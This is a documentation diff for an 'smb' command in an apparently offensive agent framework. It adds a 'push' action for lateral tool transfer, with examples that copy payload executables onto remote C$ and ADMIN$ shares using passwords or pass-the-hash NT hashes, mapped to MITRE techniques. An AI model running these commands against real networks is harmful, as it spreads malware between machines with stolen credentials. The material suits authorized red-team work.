@@ -15,16 +15,17 @@ Uses the `go-smb2` library for SMB2 protocol operations (pure Go, CGO_ENABLED=0)
 
 Argument | Required | Description
 ---------|----------|------------
-action | Yes | Operation: `shares` (list shares), `ls` (list directory), `cat` (read file), `upload` (write file), `rm` (delete file), `mkdir` (create directory), `mv` (rename/move)
+action | Yes | Operation: `shares`, `ls`, `cat`, `upload`, `rm`, `mkdir`, `mv`, `push` (lateral tool transfer)
 host | Yes | Target host IP or hostname
 username | Yes | Username for NTLM auth (supports `DOMAIN\user` or `user@domain` format)
 password | No* | Password for NTLM auth (*required unless `-hash` is provided)
 hash | No* | NT hash for pass-the-hash (hex, e.g., `aad3b435...:8846f7ea...` or just the NT hash)
 domain | No | NTLM domain (auto-detected from username if `DOMAIN\user` or `user@domain` format)
-share | Conditional | Share name (e.g., `C$`, `ADMIN$`, `SYSVOL`). Required for ls, cat, upload, rm, mkdir, mv.
-path | Conditional | Path within the share. Required for cat, upload, rm, mkdir, mv. Optional for ls. For mv, this is the source path.
+share | Conditional | Share name (e.g., `C$`, `ADMIN$`, `SYSVOL`). Required for ls, cat, upload, rm, mkdir, mv, push.
+path | Conditional | Path within the share. Required for cat, upload, rm, mkdir, mv, push. For mv, this is the source path.
 content | Conditional | File content to write (required for upload action)
 destination | Conditional | Target path within the share (required for mv action)
+source | Conditional | Local file path on the agent to push (required for push action)
 port | No | SMB port (default: 445)
 
 ## Usage
@@ -62,6 +63,12 @@ smb -action mkdir -host 192.168.1.1 -share C$ -path Users/Public/staging/exfil -
 Rename/move a file:
 ```
 smb -action mv -host 192.168.1.1 -share C$ -path Users/Public/old.txt -destination Users/Public/new.txt -username admin -password pass -domain CORP
+```
+
+Push a local file to a remote share (lateral tool transfer):
+```
+smb -action push -host 192.168.1.1 -share C$ -path temp/payload.exe -source /tmp/payload.exe -username admin -password pass -domain CORP
+smb -action push -host dc01 -share ADMIN$ -path payload.exe -source /opt/tools/fawkes.exe -username admin -hash 8846f7eaee8fb117 -domain CORP
 ```
 
 ### Pass-the-Hash (PTH)
@@ -138,7 +145,8 @@ On Windows, `make-token` creates an impersonation token from credentials. While 
 
 | Scenario | Command |
 |----------|---------|
-| Copy file **to** remote host | `smb -action upload` |
+| Push binary/payload **to** remote host | `smb -action push` (reads local file) |
+| Copy text **to** remote host | `smb -action upload` (inline content) |
 | Copy file **from** remote host | `smb -action cat` (or `download` for agent's own files) |
 | List files on remote share | `smb -action ls` |
 | Delete file on remote host | `smb -action rm` |
@@ -160,5 +168,6 @@ On Windows, `make-token` creates an impersonation token from credentials. While 
 
 - **T1021.002** - Remote Services: SMB/Windows Admin Shares
 - **T1550.002** - Use Alternate Authentication Material: Pass the Hash
+- **T1570** - Lateral Tool Transfer (push action)
 
 {{% notice info %}}Cross-Platform — works on Windows, Linux, and macOS{{% /notice %}}
